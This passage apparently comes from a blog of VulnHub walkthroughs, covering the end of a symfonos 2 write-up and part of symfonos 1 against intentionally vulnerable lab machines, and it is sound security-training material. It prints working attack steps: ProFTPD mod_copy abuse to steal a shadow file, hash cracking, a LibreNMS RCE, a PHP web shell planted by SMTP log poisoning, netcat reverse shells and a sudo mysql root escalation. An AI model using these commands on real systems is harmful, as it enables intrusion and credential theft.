   read </span>only <span class="o">=</span> <span class="nb">yes
   </span>guest ok <span class="o">=</span> <span class="nb">yes</span>
   ...
root@symfonos2:~# <span class="nb">cat</span> /usr/local/etc/proftpd.conf
<span class="c"># Port 21 is the standard FTP port.</span>
Port                            21
...
<span class="c"># Set the user and group under which the server will run.</span>
User                            aeolus
Group                           aeolus

...
<span class="c"># A basic anonymous configuration, no upload directories.  If you do not</span>
<span class="c"># want anonymous users, simply delete this entire &lt;Anonymous&gt; section.</span>
&lt;Anonymous ~ftp&gt;
  User                          ftp
  Group                         ftp

</code></pre></div></div>

<h3 id="proftpd-enumeration">ProFTPD Enumeration</h3>
<p>If we notice the version of the ProFTPD service is vulnerable to <strong>File Copy</strong>, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit ProFTPD 1.3.5    
<span class="nt">-----------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
 Exploit Title                                                               |  Path
<span class="nt">-----------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
ProFTPd 1.3.5 - <span class="s1">'mod_copy'</span> Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                    | linux/remote/37262.rb
ProFTPd 1.3.5 - <span class="s1">'mod_copy'</span> Remote Command Execution                          | linux/remote/36803.py
ProFTPd 1.3.5 - <span class="s1">'mod_copy'</span> Remote Command Execution <span class="o">(</span>2<span class="o">)</span>                      | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                    | linux/remote/36742.txt
<span class="nt">-----------------------------------------------------------------------------</span> <span class="nt">--------------------------</span>
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="proftpd-service">ProFTPD Service</h3>
<p>Taking advantage of the fact that we can copy files via ftp, we will try to copy the <strong>shadow.back</strong> file to the samba <strong>share</strong> directory of aeolus, to later download this file to the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc 192.168.179.136 21                    
220 ProFTPD 1.3.5 Server <span class="o">(</span>ProFTPD Default Installation<span class="o">)</span> <span class="o">[</span>192.168.179.136]
SITE CPFR /var/backups/shadow.bak
350 File or directory exists, ready <span class="k">for </span>destination name
SITE CPTO /home/aeolus/share/shadow.back
250 Copy successful
quit
221 Goodbye.
root@kali:~<span class="nv">$ </span>smbclient //192.168.179.136/anonymous <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span>
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> get shadow.back
getting file <span class="se">\s</span>hadow.back of size 1173 as shadow.back <span class="o">(</span>54.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 54.5 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\&gt;</span> quit
</code></pre></div></div>
<p>After the <strong>shadow.back</strong> file has been downloaded, I filtered the password hashes to the systemHashes.txt file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\$6[^:]*'</span> shadow.back <span class="o">&gt;</span> systemHashes.txt
</code></pre></div></div>
<p>Then I proceed to crack the password hashes and after a few minutes I had the password <strong>sergioteamo</strong> for the <strong>aeolus</strong> user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> wordlist.txt
root@kali:~<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 1800 systemHashes.txt wordlist.txt
...
<span class="nv">$6$dgjUjE</span>.Y<span class="nv">$G</span>.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:sergioteamo
...
</code></pre></div></div>

<h3 id="login-via-ssh">Login via SSH</h3>
<p>Later I log in to the ssh service with the username <strong>aeolus</strong> and tha password <strong>sergioteamo</strong>.</p>

<p>listing the local services I realize that other services are running locally, port 8080 is possibly a web server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh aeolus@192.168.179.136
aeolus@192.168.179.136<span class="s1">'s password: 
aeolus@symfonos2:~$ whoami
aeolus
aeolus@symfonos2:~$ uname -a
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux
aeolus@symfonos2:~$ ss -antl
State       Recv-Q Send-Q                Local Address:Port                       Peer Address:Port
LISTEN      0      80                        127.0.0.1:3306                                  *:* 
LISTEN      0      50                                *:139                                   *:* 
LISTEN      0      128                       127.0.0.1:8080                                  *:* 
LISTEN      0      32                                *:21                                    *:* 
LISTEN      0      128                               *:22                                    *:* 
LISTEN      0      20                        127.0.0.1:25                                    *:* 
LISTEN      0      50                                *:445                                   *:* 
LISTEN      0      50                               :::139                                  :::* 
LISTEN      0      64                               :::80                                   :::* 
LISTEN      0      128                              :::22                                   :::* 
LISTEN      0      20                              ::1:25                                   :::* 
LISTEN      0      50                               :::445                                  :::*
</span></code></pre></div></div>

<h3 id="local-port-forwarding">Local Port Forwarding</h3>
<p>To comprobe what is really running on this port I did ssh port forwarding to be able to access this service, notice that port 4444 is listening on our attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-L</span> 4444:127.0.0.1:8080 aeolus@192.168.179.136 <span class="nt">-N</span> 
aeolus@192.168.179.136<span class="s1">'s password:

root@kali:~$ ss -antl | grep 4444
LISTEN 0      128        127.0.0.1:4444      0.0.0.0:*    
LISTEN 0      128            [::1]:4444         [::]:*
</span></code></pre></div></div>

<p>Using the web browser I explore the service and come across a login page, I try to log in with the same credentials that I used when I logged into the ssh service.</p>

<p><strong>username:</strong> aeolus
<strong>password:</strong> sergioteamo</p>

<p><img src="/assets/images/symfonos2/screenshot-1.png" alt="" /></p>

<p><img src="/assets/images/symfonos2/screenshot-2.png" alt="" /></p>

<p>After logging into the web page I found a vulnerability for this version of <strong>LibreNMS</strong>, a Remote Code Execution.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit librenms
<span class="nt">-----------------------------------------------------------------------------------------</span> <span class="nt">-----------------------------</span>
 Exploit Title                                                                           |  Path
<span class="nt">-----------------------------------------------------------------------------------------</span> <span class="nt">-----------------------------</span>
LibreNMS - addhost Command Injection <span class="o">(</span>Metasploit<span class="o">)</span>                                        | linux/remote/46970.rb
LibreNMS - Collectd Command Injection <span class="o">(</span>Metasploit<span class="o">)</span>                                       | linux/remote/47375.rb
LibreNMS 1.46 - <span class="s1">'addhost'</span> Remote Code Execution                                          | php/webapps/47044.py
LibreNMS 1.46 - <span class="s1">'search'</span> SQL Injection                                                   | multiple/webapps/48453.txt
LibreNMS 1.46 - MAC Accounting Graph Authenticated SQL Injection                         | multiple/webapps/49246.py
<span class="nt">-----------------------------------------------------------------------------------------</span> <span class="nt">-----------------------------</span>
</code></pre></div></div>
<p>Then I copy the python exploit to my current directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> php/webapps/47044.py
</code></pre></div></div>
<p>To execute this exploit we need the cookie value, so we intercept the request with burpsuite ones we have logged in, as shown below:</p>

<p><img src="/assets/images/symfonos2/screenshot-3.png" alt="" /></p>

<p>Then we set up a netcat listener, we run the exploit and get a reverse shell with the cronos user privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python 47044.py http://127.0.0.1:4444 <span class="s2">"XSRF-TOKEN=eyJpdiI6Im5qelNNcTM4MzdFUGIwRENITXl6WFE9PSIsInZhbHVlIjoic2p5Ynd0Z3dFYnI0aHF3RW9EZkRSZjZVcktjRFRGK3BCRzZWK1hmcEFBVDcrN3VXa29QQkxBQ2EwSlhnR3gyc0krR3hMMDVNbHFramdYQ0VqTTErOFE9PSIsIm1hYyI6ImNkNjA3MTdjZjlhNjVjZDBhYzViMGVjNDUyOWQwYTM5ODFjZTM1NzY0YWNkYzhmNzcxYjdiNTZhYmI3ZTYxMWIifQ%3D%3D; librenms_session=eyJpdiI6IlFTa0FXbEk4bEFGUmk4QVJieURjNFE9PSIsInZhbHVlIjoiXC9tYk9xYWtNUkx4eXdHRldKOWdqdGFQNms5WVwvOFdiUzhYVTJPajNoQ2poZzVtVW1QaE8yQkQwYXpESWYrY0hhVDNnS29DZVlHcGc4SHczbXlCa3NSUT09IiwibWFjIjoiODQ0ZTM5YWMyOGJhMDhhOWRhNTQ1MjQyNmZlY2Y4N2EzNWViNGNmZmM5NWZlZTlmZTg2NDBmNDVhZTI5MWVkMCJ9; PHPSESSID=l1gcq7e0u3q4bt5qm79b6n2b92"</span> 192.168.179.1 1337  
<span class="o">[</span>+] Device Created Sucssfully
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.136] 36538
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ id
uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
$ uname -a
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux
$ python -c '</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
cronus@symfonos2:/opt/librenms$ 
</span></code></pre></div></div>

<p><strong>MySQL Credentials</strong></p>

<p>Enumerating a little bit I find the MySQL access credentials from LibreNMS.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cronus@symfonos2:/opt/librenms<span class="nv">$ </span><span class="nb">head </span>config.php
&lt;?php
<span class="c">## Have a look in defaults.inc.php for examples of settings you can set here. DO NOT EDIT defaults.inc.php!</span>

<span class="c">### Database config</span>
<span class="nv">$config</span><span class="o">[</span><span class="s1">'db_host'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
<span class="nv">$config</span><span class="o">[</span><span class="s1">'db_port'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'3306'</span><span class="p">;</span>
<span class="nv">$config</span><span class="o">[</span><span class="s1">'db_user'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'librenms'</span><span class="p">;</span>
<span class="nv">$config</span><span class="o">[</span><span class="s1">'db_pass'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'VLby8dGg4rvw33sg'</span><span class="p">;</span>
<span class="nv">$config</span><span class="o">[</span><span class="s1">'db_name'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'librenms'</span><span class="p">;</span>
<span class="nv">$config</span><span class="o">[</span><span class="s1">'db_socket'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="mysql-sudo-rights">MySQL Sudo Rights</h3>
<p>Checking the sudo permissions for the current user I find that the mysql binary is possible run it as sudo without password, to escalate privileges we just log in to mysql with the credentials <strong>librenms:VLby8dGg4rvw33sg</strong> and abuse the mysql feature of executing commands, so we invoke a hash and get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cronus@symfonos2:/opt/librenms/html<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>                                                                                                                       
Matching Defaults entries <span class="k">for </span>cronus on symfonos2:                                                                                                                 
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin                                                         
                                                                                                                                                                   
User cronus may run the following commands on symfonos2:                                                                                                           
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/mysql

cronus@symfonos2:/opt/librenms/html<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/mysql <span class="nt">-u</span> librenms <span class="nt">-p</span>              
Enter password: VLby8dGg4rvw33sg
MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> <span class="se">\!</span> bash
root@symfonos2:/opt/librenms/html# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - symfonos 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>May 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Beginner real life based machine designed to teach a interesting way of obtaining a low priv shell.</p>

<p><strong>Author:</strong> Zayotic</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/symfonos-1,322/">https://www.vulnhub.com/entry/symfonos-1,322/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>
<p>We start to discover the target machine with nmap as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sn</span> <span class="nt">-n</span> 192.168.179.1-254
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-29 16:59 <span class="nt">-05</span>
Nmap scan report <span class="k">for </span>192.168.179.1
Host is up.
Nmap scan report <span class="k">for </span>192.168.179.135
Host is up <span class="o">(</span>0.00066s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:0C:29:FC:7D:4F <span class="o">(</span>VMware<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.254
Host is up <span class="o">(</span>0.00020s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:50:56:FC:8B:E8 <span class="o">(</span>VMware<span class="o">)</span>
Nmap <span class="k">done</span>: 254 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>4.90 seconds
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Identified our target it’s time to perform a TCP and UDP scan with unicornscan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-Iv</span> <span class="nt">-mT</span> <span class="nt">-p1-65535</span> 192.168.179.135 <span class="o">&amp;&amp;</span> us <span class="nt">-Iv</span> <span class="nt">-mU</span> <span class="nt">-p1-65535</span> 192.168.179.135
...
TCP open                     ssh[   22]         from 192.168.179.135  ttl 64 
TCP open                    smtp[   25]         from 192.168.179.135  ttl 64 
TCP open                    http[   80]         from 192.168.179.135  ttl 64 
TCP open             netbios-ssn[  139]         from 192.168.179.135  ttl 64 
TCP open            microsoft-ds[  445]         from 192.168.179.135  ttl 64 
...
</code></pre></div></div>
<p>Of the scan performed the identified UDP ports were false positives, so I focus to perform the service enumeration of the TCP ports.</p>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>With nmap I perform the banner grabbing of the services running on the open TCP ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-n</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> <span class="nt">-p22</span>,25,80,139,445 192.168.179.135 <span class="nt">-oN</span> nmap-service-enum.txt
...
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 <span class="o">(</span>RSA<span class="o">)</span>
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d <span class="o">(</span>ED25519<span class="o">)</span>
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>80/tcp  open  http        Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:FC:7D:4F (VMware)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
</span></code></pre></div></div>

<h3 id="samba-enumeration">Samba Enumeration</h3>

<p>Then I focus on enumerate the samba service, with the purpose of listing the shared folders, how we can see the <strong>anonymous</strong> folder has read only permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>smbmap <span class="nt">-H</span> 192.168.179.135 
<span class="o">[</span>+] Guest session       IP: 192.168.179.135:445 Name: 192.168.179.135 
    Disk                           Permissions     Comment
    <span class="nt">----</span>                           <span class="nt">-----------</span>     <span class="nt">-------</span>
    print<span class="nv">$ </span>                        NO ACCESS       Printer Drivers
    helios                         NO ACCESS       Helios personal share
    anonymous                      READ ONLY
    IPC<span class="nv">$ </span>                          NO ACCESS       IPC Service <span class="o">(</span>Samba 4.5.16-Debian<span class="o">)</span>
</code></pre></div></div>

<p>Later I enumerate for samba users and domains with rpcclient as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> 192.168.179.135
rpcclient <span class="nv">$&gt;</span> enumdomusers
user:[helios] rid:[0x3e8]
rpcclient <span class="nv">$&gt;</span> enumdomains
name:[SYMFONOS] idx:[0x0]
name:[Builtin] idx:[0x1]
</code></pre></div></div>
<p>In the result obtained we can only see the <strong>helios</strong> user, but we cannot acces his shared folder because we don’t know the password, so we try to log in with a null session to the anonymous folder.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>smbclient //192.168.179.135/anonymous <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span>
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Fri Jun 28 20:14:49 2019
  ..                                  D        0  Fri Jun 28 20:12:15 2019
  attention.txt                       N      154  Fri Jun 28 20:14:49 2019

                19994224 blocks of size 1024. 17293984 blocks available
smb: <span class="se">\&gt;</span> get attention.txt
getting file <span class="se">\a</span>ttention.txt of size 154 as attention.txt <span class="o">(</span>16.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 16.7 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\&gt;</span> <span class="nb">exit

</span>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>attention.txt 

Can <span class="nb">users </span>please stop using passwords like <span class="s1">'epidioko'</span>, <span class="s1">'qwerty'</span> and <span class="s1">'baseball'</span><span class="o">!</span> 

Next person I find using one of these passwords will be fired!

<span class="nt">-Zeus</span>
</code></pre></div></div>

<p>We find the <strong>attention.txt</strong> file, download it and see the content specifying that users stop using weak passwords, possibly a of these belongs to helios user.</p>

<p>Then we try with the following credentials <strong>helios:qwerty</strong> and we have access.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>smbclient //192.168.179.135/helios <span class="nt">-U</span> <span class="s2">"helios"</span>    
Enter WORKGROUP<span class="se">\h</span>elios<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Fri Jun 28 19:32:05 2019
  ..                                  D        0  Fri Jun 28 19:37:04 2019
  research.txt                        A      432  Fri Jun 28 19:32:05 2019
  todo.txt                            A       52  Fri Jun 28 19:32:05 2019

                19994224 blocks of size 1024. 17284192 blocks available
smb: \&gt; get research.txt
getting file \research.txt of size 432 as research.txt (60.3 KiloBytes/sec) (average 37.3 KiloBytes/sec)
smb: \&gt; get todo.txt
getting file \todo.txt of size 52 as todo.txt (6.3 KiloBytes/sec) (average 29.5 KiloBytes/sec)
smb: \&gt; exit

root@kali:~$ cat research.txt 
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
root@kali:~$ cat todo.txt 

1. Binge watch Dexter
2. Dance
3. Work on /h3l105
</span></code></pre></div></div>
<p>We found two files we download it and we see at the bottom of the <strong>todo.txt</strong> file the word <strong>h3l105</strong>, this is possibly a directory name.</p>

<h3 id="web-enumeration">Web Enumeration</h3>
<p>We check with the browser the h3l105 directory, but the web page doesn’t resolv, to work around this problem assign the following instruction to the hosts file, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"192.168.179.135 symfonos.local"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</code></pre></div></div>

<p>Solved the problem, we see that it’s a wordpress CMS.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://symfonos.local/h3l105/
</code></pre></div></div>
<p><img src="/assets/images/symfonos1/screenshot-1.png" alt="" /></p>

<p>Then I fire wpscan to find potetial vulnerabilities in wordpress CMS, and I find the <strong>site-editor version 1.1.1</strong>, which is vulnerable to Local File Inclusion.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://symfonos.local/h3l105/ 
...
<span class="o">[</span>+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 <span class="o">(</span>up to <span class="nb">date</span><span class="o">)</span>
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
 |
 | Version: 1.1.1 <span class="o">(</span>80% confidence<span class="o">)</span>
 | Found By: Readme - Stable Tag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt
 ...
</code></pre></div></div>
<p>I found the exploit in <a href="https://www.exploit-db.com/exploits/44340">exploitdb</a>, downloaded it and analyzed the proof of concept.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget https://www.exploit-db.com/download/44340
root@kali:~<span class="nv">$ </span><span class="nb">cat </span>44340
...
 <span class="k">**</span> Proof of Concept <span class="k">**</span>
http://&lt;host&gt;/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path<span class="o">=</span>/etc/passwd
...
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="local-file-inclusion">Local File Inclusion</h3>

<p>Later I check the proof of concept requesting the system <strong>passwd</strong> file and we obtain its content.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path<span class="o">=</span>/etc/passwd
</code></pre></div></div>
<p><img src="/assets/images/symfonos1/screenshot-2.png" alt="" /></p>

<p>If we remember the SMTP service is running, so I verify if it’s possible to inject the logs file, and how we can see the helios log file is getting, note the helios mail address, note we found the helios mail address.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path<span class="o">=</span>/var/mail/helios
</code></pre></div></div>
<p><img src="/assets/images/symfonos1/screenshot-3.png" alt="" /></p>

<h3 id="smtp-log-poisoning">SMTP Log Poisoning</h3>
<p>With the helios mail address, we will try to send you an email with an injected web shell, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc 192.168.179.135 25 
220 symfonos.localdomain ESMTP Postfix <span class="o">(</span>Debian/GNU<span class="o">)</span>
VRFY helios@symfonos.localdomain 
252 2.0.0 helios@symfonos.localdomain
MAIL FROM:s4rgaz@mail.com
250 2.1.0 Ok
RCPT TO:helios@symfonos.localdomain 
250 2.1.5 Ok
DATA
354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
&lt;?php passthru<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span> ?&gt;
<span class="nb">.</span>
250 2.0.0 Ok: queued as C062B40833
quit
221 2.0.0 Bye
</code></pre></div></div>
<p>Then we try to execute the uname command by sending it as a parameter and we get the result.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path<span class="o">=</span>/var/mail/helios<span class="se">\&amp;</span><span class="nv">cmd</span><span class="o">=</span><span class="nb">uname</span>%20-a
...

Linux symfonos 4.9.0-9-amd64 <span class="c">#1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux</span>

<span class="o">{</span><span class="s2">"success"</span>:true,<span class="s2">"data"</span>:<span class="o">{</span><span class="s2">"output"</span>:[]<span class="o">}}</span>
</code></pre></div></div>

<p><strong>Getting a reverse shell</strong></p>

<p>Set up a netcat listener on port 443 and run the netcat reverse shell, and finally we have a low privileges shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path<span class="o">=</span>/var/mail/helios<span class="se">\&amp;</span><span class="nv">cmd</span><span class="o">=</span>nc%20192.168.179.1%20443%20-e%20/bin/bash
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.135] 47738
which python
/usr/bin/python
python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
&lt;ite-editor/editor/extensions/pagebuilder/includes<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>helios<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>helios<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>helios<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="path-hijacking">Path Hijacking</h3>
<p>Enumerting for SUID permissions I found the <strong>statuscheck</strong> binary, witch catches my attention.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helios@symfonos:/var/www/html/h3l105<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck
/bin/mount
/bin/umount
/bin/su
/bin/ping
</code></pre></div></div>
<p>I execute the binary and I see that it’s getting the request headers.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helios@symfonos:/var/www/html/h3l105<span class="nv">$ </span>/opt/statuscheck
HTTP/1.1 200 OK  
